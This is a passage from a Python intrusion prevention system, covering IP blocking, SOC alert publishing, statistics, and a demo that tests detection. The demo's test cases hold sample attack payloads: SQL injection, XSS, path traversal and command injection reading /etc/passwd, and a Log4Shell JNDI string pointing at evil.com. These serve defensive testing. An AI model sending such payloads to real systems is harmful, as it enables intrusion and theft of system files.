            self.logger.critical(f"QUARANTINE triggered for {event.source_ip}")

    def _block_threat(self, ip: str, reason: str, attack_type: AttackType,
                      duration: BlockDuration = BlockDuration.TEMPORARY_1HOUR):
        """
        Block a threatening IP.

        Args:
            ip: IP to block
            reason: Block reason
            attack_type: Type of attack
            duration: Block duration
        """
        self.block_manager.block_ip(
            ip=ip,
            reason=reason,
            attack_type=attack_type,
            duration=duration
        )

        # Publish event to SOC if connected
        if self.soc:
            from security_system.core.soc_core import SecurityEvent, EventCategory, EventSeverity
            self.soc.publish_event(SecurityEvent(
                id=str(hashlib.md5(f"{time.time()}{ip}".encode()).hexdigest()[:16]),
                timestamp=datetime.now().isoformat(),
                source='IPS',
                category=EventCategory.INTRUSION,
                severity=EventSeverity.CRITICAL if duration == BlockDuration.PERMANENT else EventSeverity.WARNING,
                title=f"IP Blocked: {ip}",
                description=reason,
                source_ip=ip
            ))

    def _generate_alert(self, event: ThreatEvent, signature: AttackSignature):
        """
        Generate alert for threat event.

        Args:
            event: Threat event
            signature: Matching signature
        """
        self.stats['alerts_generated'] += 1

        # Publish to SOC if connected
        if self.soc:
            from security_system.core.soc_core import SecurityEvent, EventCategory, EventSeverity

            severity_map = {
                ThreatLevel.LOW: EventSeverity.NOTICE,
                ThreatLevel.MEDIUM: EventSeverity.WARNING,
                ThreatLevel.HIGH: EventSeverity.ERROR,
                ThreatLevel.CRITICAL: EventSeverity.CRITICAL,
                ThreatLevel.EMERGENCY: EventSeverity.ALERT,
            }

            self.soc.publish_event(SecurityEvent(
                id=event.id,
                timestamp=event.timestamp,
                source='IPS',
                category=EventCategory.INTRUSION,
                severity=severity_map.get(event.threat_level, EventSeverity.WARNING),
                title=f"Attack Detected: {signature.name}",
                description=signature.description,
                source_ip=event.source_ip,
                dest_ip=event.dest_ip,
                tags=[event.attack_type.name, signature.id]
            ))

    def get_stats(self) -> Dict[str, Any]:
        """
        Get IPS statistics.

        Returns:
            Statistics dictionary
        """
        return {
            **self.stats,
            'signatures_loaded': len(self.signature_db.signatures),
            'blocked_ips': len(self.block_manager.blocked_ips),
            'rate_limited_ips': len(self.rate_limiter.exceeded_counts),
            'threat_score_ips': len([s for s in self.threat_scores.values() if s > 0])
        }

    def get_blocked_ips(self) -> List[Dict]:
        """
        Get list of blocked IPs.

        Returns:
            List of blocked IP info
        """
        return [
            {
                'ip': b.ip,
                'reason': b.reason,
                'attack_type': b.attack_type.name,
                'blocked_at': b.blocked_at,
                'expires_at': b.expires_at,
                'block_count': b.block_count
            }
            for b in self.block_manager.get_blocked_ips()
        ]

    def add_to_whitelist(self, ip: str):
        """Add IP to whitelist."""
        self.block_manager.add_to_whitelist(ip)

    def remove_from_whitelist(self, ip: str):
        """Remove IP from whitelist."""
        self.block_manager.remove_from_whitelist(ip)


# =============================================================================
# DEMO AND TESTING
# =============================================================================

def run_demo():
    """
    Demonstrate IPS functionality.
    """
    print("""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║               ELECTRODUCTION INTRUSION PREVENTION SYSTEM                      ║
║                           Active Defense Demo                                 ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
    """)

    # Create IPS
    ips = IntrusionPreventionSystem()
    ips.start()

    print(f"[*] Loaded {len(ips.signature_db.signatures)} attack signatures")

    # Test various attack payloads
    test_cases = [
        {
            'name': 'Normal Request',
            'payload': b'GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n',
            'source_ip': '192.168.1.100',
        },
        {
            'name': 'SQL Injection (Union)',
            'payload': b"GET /search?q=test' UNION SELECT * FROM users-- HTTP/1.1",
            'source_ip': '10.0.0.50',
        },
        {
            'name': 'XSS Attack',
            'payload': b'POST /comment HTTP/1.1\r\n\r\n<script>alert(1)</script>',
            'source_ip': '10.0.0.51',
        },
        {
            'name': 'Path Traversal',
            'payload': b'GET /files/../../../etc/passwd HTTP/1.1',
            'source_ip': '10.0.0.52',
        },
        {
            'name': 'Command Injection',
            'payload': b'GET /api?cmd=ls; cat /etc/passwd HTTP/1.1',
            'source_ip': '10.0.0.53',
        },
        {
            'name': 'Log4Shell Exploit',
            'payload': b'GET /api HTTP/1.1\r\nX-Api-Version: ${jndi:ldap://evil.com/a}',
            'source_ip': '10.0.0.54',
        },
        {
            'name': 'SQLMap Scanner',
            'payload': b'GET / HTTP/1.1\r\nUser-Agent: sqlmap/1.4',
            'source_ip': '10.0.0.55',
        },
    ]

    print("\n[*] Testing attack detection and prevention...\n")

    for test in test_cases:
        result = ips.analyze_packet(
            test['payload'],
            test['source_ip'],
            dest_ip='192.168.1.1',
            dest_port=80
        )

        status = "🔴 BLOCKED" if result.blocked else (
            "🟡 DETECTED" if result.threat_level != ThreatLevel.NONE else "🟢 ALLOWED"
        )

        print(f"  {status} | {test['name']}")
        print(f"           Threat: {result.threat_level.name} | Type: {result.attack_type.name}")
        if result.signature_id:
            print(f"           Signature: {result.signature_id}")
        print()

    # Show statistics
    print("\n[*] IPS Statistics:")
    stats = ips.get_stats()
    for key, value in stats.items():
        print(f"    {key}: {value}")

    # Show blocked IPs
    blocked = ips.get_blocked_ips()
    if blocked:
        print(f"\n[*] Blocked IPs ({len(blocked)}):")
        for b in blocked:
            print(f"    {b['ip']} - {b['reason']}")

    ips.stop()
    print("\n[*] Demo completed!")


if __name__ == "__main__":
    run_demo()
